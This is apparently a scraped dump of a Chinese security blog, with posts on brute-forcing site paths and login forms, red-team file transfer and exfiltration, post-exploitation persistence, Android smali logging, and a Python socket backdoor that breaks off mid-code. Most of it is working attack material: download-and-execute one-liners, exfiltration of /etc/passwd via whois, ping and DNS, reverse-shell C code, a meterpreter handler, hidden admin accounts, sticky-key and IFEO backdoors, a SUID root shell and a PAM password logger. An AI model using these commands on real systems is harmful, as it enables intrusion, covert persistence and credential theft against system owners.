首先是利用python遍历路径，采用字典爆破的形式，当然如果只是单纯的爆破路径，简单写一个多线程脚本就行了。这里考虑如何对爆破到的路径进行第二步利用，此处尝试对猜解到的路径进行表单发现及登陆爆破处理。 ​ 首先就是路径爆破，采用多线程队列，爆破路径，判断形式为200响应码。 while not self._queue.empty(): queue &#x3D; self._queue.get(timeout&#x3D;0.5) try: r &#x3D; requests.get(self.url+queue,timeout&#x3D;5, headers&#x3D;self.headers) if r.status_code &#x3D;&#x3D; 200: print &quot;[200] %s&quot; %(queue) soup &#x3D; BeautifulSoup(r.content,&#39;html.parser&#39;) if soup.find(&#39;form&#39;): self.brute(soup, queue) 猜解到路径后交给brute方法处理，方法实现了一个css选择器，获取form表单中的input字段标签，提取标签参数组合成post参数值，然后提取表单中的action跳转页面，如没有页面默认在当前表单页提交。 input &#x3D; soup.select(&quot;form input&quot;) for i in input: try: if i.attrs[&#39;type&#39;] &#x3D;&#x3D; &quot;hidden&quot;: name, value &#x3D; i.attrs[&#39;name&#39;], i.attrs[&#39;value&#39;] list_post.append(name+&#39;&#x3D;&#39;+value) elif i.attrs[&#39;type&#39;] &#x3D;&#x3D; &#39;password&#39;: name &#x3D; i.attrs[&#39;name&#39;] list_post.append(name+&#39;&#x3D;$$$&#39;) else: name &#x3D; i.attrs[&#39;name&#39;] list_post.append(name+&#39;&#x3D;%%%&#39;) except: continue for i in list_post: post &#x3D; post + i + &#39;&amp;&#39; action &#x3D; soup.find_all(&#39;form&#39;) for i in action: if i[&#39;action&#39;]: actiontag &#x3D; i[&#39;action&#39;] else: actiontag &#x3D; queue self.payload(post, actiontag) 获取参数值后，交给payload方法处理登陆，采用requests库的session登陆。获取cookie，先采用session请求获取cookie后，再采用session携带cookie进行请求提交。然后对输入的验证值进行判断是否为登陆成功。 for name in self.username(): post_user &#x3D; post.replace(&#39;%%%&#39;,name.strip()) for pwd in self.password(): post_pwd &#x3D; post_user.replace(&#39;$$$&#39;,pwd.strip()) session &#x3D; requests.Session() session.get(self.url+&#39;&#x2F;&#39;+action, headers&#x3D;self.headers, verify&#x3D;False) r &#x3D; session.post(self.url+&#39;&#x2F;&#39;+action, data&#x3D;post_pwd, headers&#x3D;self.headers, verify&#x3D;False) if self.word in r.content: print &#39;[username] %s&#39; %name +&#39;\\r&#39; + &#39;[password] %s&#39; %pwd return 为了判断是否登陆成功，采用的人为输入判断字符串的形式。也就是脚本执行形式为 python xxx.py http:&#x2F;&#x2F;xxxx.com xxxxx","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://misakikata.github.io/tags/python/"}]},{"title":"红队后渗透测试中的文件传输技巧","slug":"红队后渗透测试中的文件传输技巧","date":"2019-03-08T01:25:06.000Z","updated":"2019-03-08T01:40:57.000Z","comments":true,"path":"2019/03/红队后渗透测试中的文件传输技巧/","link":"","permalink":"https://misakikata.github.io/2019/03/%E7%BA%A2%E9%98%9F%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%8A%80%E5%B7%A7/","excerpt":"","text":"原文链接：https://xax007.github.io/2019-01-13-post-exploitation-file-transfer-tips/ 在红队渗透测试当中往往需要最大化利用当前的环境绕过重兵防守的系统的防火墙、IDS、IPS等报警和监控系统进行文件传输，本文列出了多种利用操作系统默认自带的工具进行文件传输的方法。 搭建 HTTP serverPythonpython2: python -m SimpleHTTPServer 1337 以上命令会在当前目录启动 HTTP 服务，端口为 1337 python3: python -m http.server 1337 以上命令会在当前目录启动 HTTP 服务，端口为 1337 PHP 5.4+当 PHP 版本大于 5.4 是，可使用 PHP 在当前目录启动 HTTP 服务，端口为 1337 php -S 0.0.0.0:1337 Ruby下面的命令会在当前目录下启动 HTTP 服务，端口为 1337 ruby -rwebrick -e&#39;WEBrick::HTTPServer.new(:Port &#x3D;&gt; 1337, :DocumentRoot &#x3D;&gt; Dir.pwd).start&#39; Ruby 1.9.2+ruby -run -e httpd . -p 1337 Perlperl -MHTTP::Server::Brick -e &#39;$s&#x3D;HTTP::Server::Brick-&gt;new(port&#x3D;&gt;1337); $s-&gt;mount(&quot;&#x2F;&quot;&#x3D;&gt;&#123;path&#x3D;&gt;&quot;.&quot;&#125;); $s-&gt;start&#39; perl -MIO::All -e &#39;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub &#123; $_[0] &lt; io(-x $1 +? &quot;.&#x2F;$1 |&quot; : $1) if &#x2F;^GET \\&#x2F;(.*) &#x2F; &#125;)&#39; Thanks to: http://stackoverflow.com/questions/8058793/single-line-python-webserver busybox httpdbusybox httpd -f -p 8000 本条来自:lvm 从 HTTP server 下载文件以下列出了在 Windows 和 Linux 系统下使用系统自带工具从 HTTP Server 下载文件的几种方法 Windowspowershell下载并执行: powershell (new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;1.2.3.4&#x2F;5.exe&#39;,&#39;c:\\download\\a.exe&#39;);start-process &#39;c:\\download\\a.exe&#39; certutil下载并执行: certutil -urlcache -split -f http:&#x2F;&#x2F;1.2.3.4&#x2F;5.exe c:\\download\\a.exe&amp;&amp;c:\\download\\a.exe bitsadmin下载并执行: bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;1.2.3.4&#x2F;5.exe c:\\download\\a.exe &amp;&amp; c:\\download\\a.exe ⚠️ bitsadmin 的下载速度比较慢 regsvr32regsvr32 &#x2F;u &#x2F;s &#x2F;i:http:&#x2F;&#x2F;1.2.3.4&#x2F;5.exe scrobj.dll LinuxCurlcurl http:&#x2F;&#x2F;1.2.3.4&#x2F;backdoor Wgetwget http:&#x2F;&#x2F;1.2.3.4&#x2F;backdoor awk在使用 awk 进行下载文件时，首先使用以上列出的任意一条命令启动一个 HTTP Server awk &#39;BEGIN &#123; RS &#x3D; ORS &#x3D; &quot;\\r\\n&quot; HTTPCon &#x3D; &quot;&#x2F;inet&#x2F;tcp&#x2F;0&#x2F;127.0.0.1&#x2F;1337&quot; print &quot;GET &#x2F;secret.txt HTTP&#x2F;1.1\\r\\nConnection: close\\r\\n&quot; |&amp; HTTPCon while (HTTPCon |&amp; getline &gt; 0) print $0 close(HTTPCon) &#125;&#39; 效果： Setup HTTP PUT server以下列出了上传文件到 HTTP Server 的几种方法 使用 Nginx 搭建 HTTP PUT Servermkdir -p &#x2F;var&#x2F;www&#x2F;upload&#x2F; # 创建目录 chown www-data:www-data &#x2F;var&#x2F;www&#x2F;upload&#x2F; # 修改目录所属用户和组 cd &#x2F;etc&#x2F;nginx&#x2F;sites-available # 进入 nginx 虚拟主机目录 # 写入配置到 file_upload 文件 cat &lt;&lt;EOF &gt; file_upload server &#123; listen 8001 default_server; server_name kali; location &#x2F; &#123; root &#x2F;var&#x2F;www&#x2F;upload; dav_methods PUT; &#125; &#125; EOF # 写入完毕 cd ..&#x2F;sites-enable # 进入 nginx 虚拟主机启动目录 ln -s &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;file_upload file_upload # 启用 file_upload 虚拟主机 systemctl start nginx # 启动 Nginx 使用 Python 搭建 HTTP PUT Server以下代码保存到 HTTPutServer.py 文件里: # ref: https:&#x2F;&#x2F;www.snip2code.com&#x2F;Snippet&#x2F;905666&#x2F;Python-HTTP-PUT-test-server import sys import signal from threading import Thread from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler class PUTHandler(BaseHTTPRequestHandler): def do_PUT(self): length &#x3D; int(self.headers[&#39;Content-Length&#39;]) content &#x3D; self.rfile.read(length) self.send_response(200) with open(self.path[1:], &quot;w&quot;) as f: f.write(content) def run_on(port): print(&quot;Starting a HTTP PUT Server on &#123;0&#125; port &#123;1&#125; (http:&#x2F;&#x2F;&#123;0&#125;:&#123;1&#125;) ...&quot;.format(sys.argv[1], port)) server_address &#x3D; (sys.argv[1], port) httpd &#x3D; HTTPServer(server_address, PUTHandler) httpd.serve_forever() if __name__ &#x3D;&#x3D; &quot;__main__&quot;: if len(sys.argv) &lt; 3: print(&quot;Usage:\\n\\tpython &#123;0&#125; ip 1337&quot;.format(sys.argv[0])) sys.exit(1) ports &#x3D; [int(arg) for arg in sys.argv[2:]] try: for port_number in ports: server &#x3D; Thread(target&#x3D;run_on, args&#x3D;[port_number]) server.daemon &#x3D; True # Do not make us wait for you to exit server.start() signal.pause() # Wait for interrupt signal, e.g. KeyboardInterrupt except KeyboardInterrupt: print &quot;\\nPython HTTP PUT Server Stoped.&quot; sys.exit(1) 运行方法: $ python HTTPutServer.py 10.10.10.100 1337 Starting a HTTP PUT Server on 10.10.10.100 port 1337 (http:&#x2F;&#x2F;10.10.10.100:1337) ... 上传文件到 HTTP PUT serverLinuxCurl$ curl --upload-file secret.txt http:&#x2F;&#x2F;ip:port&#x2F; Wget$ wget --method&#x3D;PUT --post-file&#x3D;secret.txt http:&#x2F;&#x2F;ip:port&#x2F; WindowsPowershell$body &#x3D; Get-Content secret.txt Invoke-RestMethod -Uri http:&#x2F;&#x2F;ip:port&#x2F;secret.txt -Method PUT -Body $body 使用 Bash /dev/tcp 进行文件传输首先需要监听端口 接收端: nc -lvnp 1337 &gt; secret.txt 发送端: cat secret.txt &gt; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 使用 SMB 协议进行文件传输搭建简易 SMB Server搭建简易SMB Server 需要用到 Impacket 项目的 smbserver.py 文件 Impacket 已默认安装在 Kali Linux 系统中 syntax: impacker-smbserver ShareName SharePath $ mkdir smb # 创建 smb 目录 $ cd smb # 进入 smb目录 $ impacket-smbserver share &#96;pwd&#96; # 在当前目录启动 SMB server，共享名称为 share 效果： 从 SMB server 下载文件copy \\\\IP\\ShareName\\file.exe file.exe 上传文件到 SMB servernet use x: \\\\IP\\ShareName copy file.txt x: net use x: &#x2F;delete 使用 whois 命令进行文件传输graph LR A[Host A] – /etc/passwd –&gt; B[Host B] 接收端 Host B： nc -vlnp 1337 | sed &quot;s&#x2F; &#x2F;&#x2F;g&quot; | base64 -d 发送端 Host A： whois -h 127.0.0.1 -p 1337 &#96;cat &#x2F;etc&#x2F;passwd | base64&#96; 效果： 使用 ping 命令进行文件传输graph LR A[Sender] – secret.txt –&gt; B[Reciver] 发送端: xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done 接收端: 以下代码保存到 ping_receiver.py import sys try: from scapy.all import * except: print(&quot;Scapy not found, please install scapy: pip install scapy&quot;) sys.exit(0) def process_packet(pkt): if pkt.haslayer(ICMP): if pkt[ICMP].type &#x3D;&#x3D; 8: data &#x3D; pkt[ICMP].load[-4:] print(f&#39;&#123;data.decode(&quot;utf-8&quot;)&#125;&#39;, flush&#x3D;True, end&#x3D;&quot;&quot;, sep&#x3D;&quot;&quot;) sniff(iface&#x3D;&quot;eth0&quot;, prn&#x3D;process_packet) 执行方法: python3 ping_receiver.py 效果 使用 dig 命令进行文件传输graph LR A[Sender] – /etc/passwd –&gt; B[Reciver] 发送端: xxd -p -c 31 &#x2F;etc&#x2F;passwd | while read line; do dig @172.16.1.100 +short +tries&#x3D;1 +time&#x3D;1 $line.gooogle.com; done 接收端: 以下代码使用了 python 的 scapy 模块，需要手动安装 代码保存到 dns_reciver.py 文件中 try: from scapy.all import * except: print(&quot;Scapy not found, please install scapy: pip install scapy&quot;) def process_packet(pkt): if pkt.haslayer(DNS): domain &#x3D; pkt[DNS][DNSQR].qname.decode(&#39;utf-8&#39;) root_domain &#x3D; domain.split(&#39;.&#39;)[1] if root_domain.startswith(&#39;gooogle&#39;): print(f&#39;&#123;bytearray.fromhex(domain[:-13]).decode(&quot;utf-8&quot;)&#125;&#39;, flush&#x3D;True, end&#x3D;&#39;&#39;) sniff(iface&#x3D;&quot;eth0&quot;, prn&#x3D;process_packet) 运行方法: python3 dns_reciver.py 效果： 使用 NetCat 进行文件传输graph LR Sender[A:10.10.10.100] – 1.txt –&gt; Reciver[B:10.10.10.200] 接受端: nc -l -p 1337 &gt; 1.txt 发送端： cat 1.txt | nc -l -p 1337 或者 nc 10.10.10.200 1337 &lt; 1.txt 在极端环境下，如果接受端没有 nc 可以使用 Bash 的 /dev/tcp 接收文件: cat &lt; &#x2F;dev&#x2F;tcp&#x2F;10.10.10.200&#x2F;1337 &gt; 1.txt","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"渗透之权限维持","slug":"渗透之权限维持","date":"2019-03-08T01:24:46.000Z","updated":"2019-03-08T01:40:48.000Z","comments":true,"path":"2019/03/渗透之权限维持/","link":"","permalink":"https://misakikata.github.io/2019/03/%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/","excerpt":"","text":"原文链接：渗透之权限维持杂谈 0x01 MSFpersistence msf内置的后渗透权限维持工具persistence Metsvc它是通过在已经获得shell的目标主机上开启了一个服务来提供后门的功能。run Metsvc -h Scheduleme &amp; Schtasksabusemsf中自动利用计划任务的后门程序，后面会聊到linux和windows平台的计划任务。 run scheduleme -h # 例子：上传nc并创建计划任务每一分钟执行一次 &#39;nc -e cmd.exe -L -p 8080&#39; run scheduleme -m 1 -e &#x2F;tmp&#x2F;nc.exe -o &quot;-e cmd.exe -L -p 8080&quot; run Schtasksabuse -h # 例子：每隔4秒执行一次calc.exe run schtasksabuse -t 192.168.2.7 -c &quot;cmd &#x2F;c calc.exe&quot; -d 4 Mof_ps_persist 现在已经找不到这个利用模块，参考：https://github.com/khr0x40sh/metasploit-modules/blob/master/persistence/mof_ps_persist.rb Autorunscript获取shell的时候自动执行持续化脚本,可以被Autorunscript执行的命令目录在metasploit/scripts/meterpreter # persistence use exploit&#x2F;multi&#x2F;handler set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp set LHOST 192.168.2.101 set LPORT 5555 set ExitOnSession false set AutoRunScript persistence -r 192.168.2.101 -p 5556 -U -X -i 30 exploit # metsvc use exploit&#x2F;multi&#x2F;handler set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp set LHOST 192.168.2.101 set LPORT 5555 set ExitOnSession false set AutoRunScript metsvc -A exploit 0x02 计划任务无论是windows还是linux操作系统都提供计划任务功能，来实现定时或者周期性的执行一些指令。自然而然我们可以在计划任务中做手脚，埋后门。 windows 图形化工具：taskschd.msc 命令行工具：schtasks.exe SCHTASKS &#x2F;parameter [arguments] 描述: 允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任 务。 参数列表: &#x2F;Create 创建新计划任务。 &#x2F;Delete 删除计划任务。 &#x2F;Query 显示所有计划任务。 &#x2F;Change 更改计划任务属性。 &#x2F;Run 按需运行计划任务。 &#x2F;End 中止当前正在运行的计划任务。 &#x2F;ShowSid 显示与计划的任务名称相应的安全标识符。 &#x2F;? 显示此帮助消息。 Examples: SCHTASKS SCHTASKS &#x2F;? SCHTASKS &#x2F;Run &#x2F;? SCHTASKS &#x2F;End &#x2F;? SCHTASKS &#x2F;Create &#x2F;? SCHTASKS &#x2F;Delete &#x2F;? SCHTASKS &#x2F;Query &#x2F;? SCHTASKS &#x2F;Change &#x2F;? SCHTASKS &#x2F;ShowSid &#x2F;? Payload examples: SCHTASKS &#x2F;Create &#x2F;TN update &#x2F;TR xx(待执行的命令) &#x2F;DELAY ONLOGON &#x2F;F &#x2F;RL HIGHEST linux 一次性执行任务：at命令———&gt;atd进程 周期性执行任务：crontab命令———&gt;crond进程 在实际的渗透过程中我们更倾向于使用crontab at - 1.服务开启 service atd start - 2.基本格式 at [HH:MM] [yyyy-mm-dd] #没有指定年月日的，默认是当天的。 - 3.查询当前设置的at任务列表 atq #或at -l - 4.删除指定任务编号的at任务 atrm 编号 #或at -d - 5.查看计划任务的具体内容 at -c 任务号 - 6.使用文件中的命令作为计划任务（比较少用） at 时间 -f 文件 - 7.相关文件 &#x2F;etc&#x2F;at.deny：#该名单里面的人不可以使用 &#x2F;etc&#x2F;at.allow：#只有该名单里面的人可以使用 crontab 注意：（1）crontab 只会在/sbin、/bin、/usr/sbin、/usr/bin下查找命令，如果命令不在这些目录中，应该要使用绝对路径。（2）只有root用户可以管理其他用户的周期性任务（3）crontab在重启后之前的周期性任务无效，anacron可以弥补crontab的缺陷。配置文件：/etc/anacrontab。anacrontab会开机自动检查没有执行的计划任务，然乎逐一执行，这个过程是用户透明的。一般而言，crontab就已经可以满足基本的需求。 - 1.服务开启 service crond start - 2.编辑计划任务 crontab -e -u 用户名 - 3.查看计划任务 crontab -l -u 用户名 - 4.删除计划任务： crontab -r -u 用户名 - 相关文件 &#x2F;var&#x2F;spool&#x2F;cron&#x2F;用户名 #用户定义的设置 &#x2F;var&#x2F;log&#x2F;cron #cron服务的日志文件 &#x2F;etc&#x2F;crontab #cron服务配置文件： anacron anacron是一个不同于crontab的任务，其只精确到天，用来弥补服务器在宕机下crond调度不周以及缓解计划任务执行过于集中的问题。它需要记录上次执行的时间，并更新到相应的/var/spool/anacron目录下，下次执行的时候会将当前时间和上次记录的时间进行对比，如果满足大于/etc/anacron的配置的天数就会立即执行相应的命令，然后刷新时间。 anacron 命令行参数： -t 配置文件路径 让anacron从指定配置文件中读取配置，常用于普通用户来管理个人任务 -S spooldir 设定新的spool目录来记录任务执行的时间戳，常用于普通用户来管理个人任务 -T 测试配置文件是否正确 -f 强制执行所有的任务，而不管之前的执行日期是否超过轮回天数 -u 将所有任务的执行日期都更新为当前日期，而不真正的执行任务 -s 串行地执行任务，只有前一个任务完成后才开始下一个任务 0x03 windows权限维持影子账户创建一个无法用用户本机用户罗列工具显示的用户，并且赋予管理员权限。所有操作需要有管理员权限。同时测试在windows server 2012服务器域环境下影子账户无法直接进行添加。 用’$’创建匿名用户，并归到administratorsa用户组 net user admin$ Test1 &#x2F;add net localgroup administrators admin$ &#x2F;add 导出匿名用户对应的sam目录下的注册表键值 regedt32.exe 打开 HKEY_LOCAL_MACHINESAMSAMDomainsAccountUsers键值，导出Names下用户目录以及对应的16进制目录。注意需要给Administrator用户赋予Sam键值权限，默认是不允许的。 删除匿名用户，双击导出的注册表文件，用先前导出的注册表键值对注册表进行修改。则可以重新还原之前的匿名用户，但是除了在注册表里面有用户记录，其他地方都不存在用户的信息。net user或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。 net user admin$ &#x2F;del PowerShell后门Empire框架 https://github.com/EmpireProject/Empire Schtasks-Backdoor https://github.com/re4lity/Schtasks-Backdoor msf use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery - 设置好参数后的powershell例子： powershell.exe -ExecutionPolicy Bypass -nop -w hidden -c $V&#x3D;new-object net.webclient;$V.proxy&#x3D;[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials&#x3D;[Net.CredentialCache]::DefaultCredentials;IEX $V.downloadstring(&#39;http:&#x2F;&#x2F;192.168.80.155:8888&#x2F;&#39;); 注册表开机启动在如下的注册表目录下注入键值HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun，可以实现开机自启动。以windows defender为例: 映像劫持 细节参考：https://www.anquanke.com/post/id/151425 涉及到的注册表项为IFEO（Image File Execution Options），默认是只有管理员和local system有权读写修改。 “HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Options” 大致的原理如下：当我们按照常理运行属于IFEO列表的文件的时候（即可执行文件名在上述的注册表项下，出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就可以正常运行。）会执行相关的选项参数，这里我们主要利用的参数是debugger,通过该参数我们可以实现偷梁换柱。下面以修改IE启动程序为例，实现运行IE程序但是启动的却是计算器。 1. 找到注册表“HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Options”目录下的iexplore.exe 2. 添加一个debugger字符串键值，并且赋值为calc.exe的执行路径，“C:Windowssystem32calc.exe” 3. 运行 iexplore.exe,bomb!!! 当然我们也可以在第一步新键一个注册表文件目录，取名为想要覆盖的可执行程序，后续步骤类似。 但是这样明目张胆的偷梁换柱有点张扬，根据安全客那篇文章，修改另外两个注册表键值可以实现原程序退出后静默运行后门程序。以执行notepad为例，退出后静默运行calc.exe reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionsnotepad.exe&quot; &#x2F;v GlobalFlag &#x2F;t REG_DWORD &#x2F;d 512 reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionSilentProcessExitnotepad.exe&quot; &#x2F;v ReportingMode &#x2F;t REG_DWORD &#x2F;d 1 reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionSilentProcessExitnotepad.exe&quot; &#x2F;v MonitorProcess &#x2F;t REG_SZ &#x2F;d &quot;C:Windowssystem32calc.exe&quot; shift后门这个后门的方式比较老，在windows登陆的时候按五次shift打开cmd进行操作。前提条件是:在将C盘windows目录下面的system32文件夹可写的情况下，将里面的sethc.exe应用程序进行转移，并生成sethc.exe.bak文件。并将cmd.exe拷贝覆盖sethc.exe。 但是在windows xp过后，sethc组件属于完全受信用的用户TrustInstall，我们无法修改名字，这时候即使administrators都只有名义上的只读和可执行权，我们可以手动修改其所属为administrators，步骤如下： 右键属性&#x2F;安全&#x2F;高级； 所有者&#x2F;编辑&#x2F;添加当前用户&#x2F;应用&#x2F;确定； 关闭窗口； 右键属性&#x2F;安全&#x2F;编辑； 选择Administrators（或者你的当前组）&#x2F;勾选完全控制&#x2F;确定； 0x04 linux权限维持可以看到windows的权限维持很多时候是基于注册表值，但是linux里面没有注册表项，但是有很多的配置文件选项，可以达到相似的功能。下面介绍一些比较实用的后门手段。 sshd软连接 原理细节： http://www.91ri.org/16803.html victim ln -sf &#x2F;usr&#x2F;sbin&#x2F;sshd &#x2F;tmp&#x2F;su; &#x2F;tmp&#x2F;su -oPort&#x3D;5555; attack ssh root@x.x.x.x -p 5555 SUID Shellroot 权限下执行如下命令，普通用户运行/dev/.rootshell即可获得root权限 cp &#x2F;bin&#x2F;bash &#x2F;dev&#x2F;.rootshell chmod u+s &#x2F;dev&#x2F;.rootshell alias瞒天过海我们可以通过alias来指定执行特定的命令时候静默运行其他程序，从而达到启动后门，记录键值等作用。下面举两个实例： 修改ssh命令，利用strace，使其具有记录ssh对read,write,connect调用的功能。 alias ssh&#x3D;&#39;strace -o &#x2F;tmp&#x2F;sshpwd-&#96;date &#39;+%d%h%m%s&#39;&#96;.log -e read,write,connect -s2048 ssh&#39; 利用守护进程回弹shell alias cat&#x3D;&#39;cat&amp;&amp;&#x2F;root&#x2F;.shell&#39; shell.c #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;time.h&gt; #include &lt;fcntl.h&gt; #include &lt;string.h&gt; #include &lt;sys&#x2F;stat.h&gt; #include &lt;signal.h&gt; #define ERR_EXIT(m) do &#123; perror(m); exit(EXIT_FAILURE); &#125; while (0); void creat_daemon(void); int main(void) &#123; time_t t; int fd; creat_daemon(); system(&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.80.167&#x2F;8080 0&gt;&amp;1&quot;); return 0; &#125; void creat_daemon(void) &#123; pid_t pid; int devnullfd,fd,fdtablesize; umask(0); pid &#x3D; fork(); if( pid &#x3D;&#x3D; -1) ERR_EXIT(&quot;fork error&quot;); if(pid &gt; 0 ) exit(EXIT_SUCCESS); if(setsid() &#x3D;&#x3D; -1) ERR_EXIT(&quot;SETSID ERROR&quot;); chdir(&quot;&#x2F;&quot;); &#x2F;* close any open file descriptors *&#x2F; for(fd &#x3D; 0, fdtablesize &#x3D; getdtablesize(); fd &lt; fdtablesize; fd++) close(fd); devnullfd &#x3D; open(&quot;&#x2F;dev&#x2F;null&quot;, 0); &#x2F;* make STDIN ,STDOUT and STDERR point to &#x2F;dev&#x2F;null *&#x2F; if (devnullfd &#x3D;&#x3D; -1) &#123; ERR_EXIT(&quot;can&#39;t open &#x2F;dev&#x2F;null&quot;); &#125; if (dup2(devnullfd, STDIN_FILENO) &#x3D;&#x3D; -1) &#123; ERR_EXIT(&quot;can&#39;t dup2 &#x2F;dev&#x2F;null to STDIN_FILENO&quot;); &#125; if (dup2(devnullfd, STDOUT_FILENO) &#x3D;&#x3D; -1) &#123; ERR_EXIT(&quot;can&#39;t dup2 &#x2F;dev&#x2F;null to STDOUT_FILENO&quot;); &#125; if (dup2(devnullfd, STDERR_FILENO) &#x3D;&#x3D; -1) &#123; ERR_EXIT(&quot;can&#39;t dup2 &#x2F;dev&#x2F;null to STDOUT_FILENO&quot;); &#125; signal(SIGCHLD,SIG_IGN); return; &#125; linux PAM密码记录后门pam是一种认证机制，它可帮助管理员快速方便地配置认证方式，并且无需更改服务程序。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的帐号密码。 https://blog.51cto.com/redkey/1343316 PROMPT_COMMAND后门bash提供了一个环境变量PROMPT_COMMAND,这个变量会在你执行命令前执行一遍。 export PROMPT_COMMAND&#x3D;&quot;lsof -i:1025 &amp;&gt;&#x2F;dev&#x2F;null || (python -c &quot;exec(&#39;encoded_payload&#39;.decode(&#39;base64&#39;))&quot; 2&gt;&#x2F;dev&#x2F;null &amp;)&quot; 当然也可以使用prompt_command进行提权,参考：https://www.anquanke.com/post/id/155943 ssh免密后门把id_rsa.pub写入服务端的/home/[用户名]/.ssh/authorized_keys中。 rootkitrootit的后门相对比较顽固，有应用级别和系统级别的rootkit，其大致的思路是hook进常规的调用中，是比较硬核的，经常体现在APT攻击中。下面是一个菊苣收集的rootkit后门的链接。具体的细节因为不同的rootkit具体实现不一致，笔者才疏，无法完全弄清楚，仅给出链接，方便日后学习。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"Android 代码插桩","slug":"Android-代码插桩","date":"2019-02-14T09:51:20.000Z","updated":"2019-07-26T09:56:26.000Z","comments":true,"path":"2019/02/Android-代码插桩/","link":"","permalink":"https://misakikata.github.io/2019/02/Android-%E4%BB%A3%E7%A0%81%E6%8F%92%E6%A1%A9/","excerpt":"","text":"何为代码插桩​ 最早是由J.C. Huang 教授提出的，它是在保证被测程序原有逻辑完整性的基础上在程序中插入一些探针（又称为“探测仪”，本质上就是进行信息采集的代码段，可以是赋值语或采集覆盖信息的函数调用，通过探针的执行并抛出程序运行的特征数据，通过对这些数据的分析，可以获得程序的控制流和数据流信息，进而得到逻辑覆盖等动态信息，从而实现测试目的的方法。 ​ 何为安卓插桩测试，插桩测试提供了一种通过 am instrument 命令启动的特殊测试执行环境，其中目标应用进程会重启并使用基本的应用上下文进行初始化，并在应用进程虚拟机内启动插桩线程。您的测试代码在此插桩线程上开始执行，并附带一个 Instrumentation 实例，该实例可提供对应用上下文和 API 的访问权限，以操纵接受测试的应用进程。 详细内容可以查看谷歌的插桩测试框架和方式：插桩测试 Log插桩此处，仅利用打印Log的方式来表示如何进行插桩。代码使用之前调试的代码，尝试来打印输入的字符串。 反编译后如下代码： 分析代码可以看到，如果需要打印输出，则实际获取到字符串的代码为 Name.getText().toString().trim() 因此，需要在onClick函数中打印输出，函数需要在按钮事件中触发，按钮相关的事件代码在MainActivity$1中。 在MainActivity$1中查看onClick函数。 假设，需要打印输入的name变量。则需要在如下添加： iget-object v1, p0, Lcom&#x2F;example&#x2F;user&#x2F;application&#x2F;MainActivity$1;-&gt;this$0:Lcom&#x2F;example&#x2F;user&#x2F;application&#x2F;MainActivity; iget-object v1, v1, Lcom&#x2F;example&#x2F;user&#x2F;application&#x2F;MainActivity;-&gt;Name:Landroid&#x2F;widget&#x2F;EditText; invoke-virtual &#123;v1&#125;, Landroid&#x2F;widget&#x2F;EditText;-&gt;getText()Landroid&#x2F;text&#x2F;Editable; move-result-object v1 invoke-virtual &#123;v1&#125;, Ljava&#x2F;lang&#x2F;Object;-&gt;toString()Ljava&#x2F;lang&#x2F;String; move-result-object v1 此内容为上图中关于带入name的smali代码，意思是，从MainActivity获取实例对象。赋值给v1寄存器，然后再调用getText()函数和toString()函数。 在添加 const-string v0, &quot;message&quot; invoke-static &#123;v0, v1&#125;, Landroid&#x2F;util&#x2F;Log;-&gt;i(Ljava&#x2F;lang&#x2F;String;Ljava&#x2F;lang&#x2F;String;)I 意思是调用Log.i函数打印输入，如上添加内容换算成Java代码类似于 Log.i(&quot;message&quot;,Name.getText().toString()); 回编译安装运行，监听日志输出，点击按钮事件可以看到如下的日志输出。 此种形式可以用在获取函数变量值和某些动态生成的参数中，来理解程序运行的结果和函数运行的方式。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"https://misakikata.github.io/tags/Android%E9%80%86%E5%90%91/"}]},{"title":"利用python socket编写后门","slug":"利用python-socket编写后门","date":"2019-02-02T03:00:50.000Z","updated":"2019-02-01T03:51:10.000Z","comments":true,"path":"2019/02/利用python-socket编写后门/","link":"","permalink":"https://misakikata.github.io/2019/02/%E5%88%A9%E7%94%A8python-socket%E7%BC%96%E5%86%99%E5%90%8E%E9%97%A8/","excerpt":"","text":"在获取系统权限时候，一般想维持权限或者做端口转发的时候，会用一些端口转发的工具，例如nc，ew，lcx等。 但在这种类似后门的工具中被查杀率和存在后门的情况时有发生，本人就遇到过获取系统权限创建账号后，发现没多久又被植入其他隐藏账号的情况。 因此，既然会写一些代码就简单的来实现一个利用socket通信的后门脚本。 如下server端： # coding:utf-8 import socket import subprocess # server def server_main(ips): server &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: server.bind((&quot;0.0.0.0&quot;, ips)) server.listen(5) 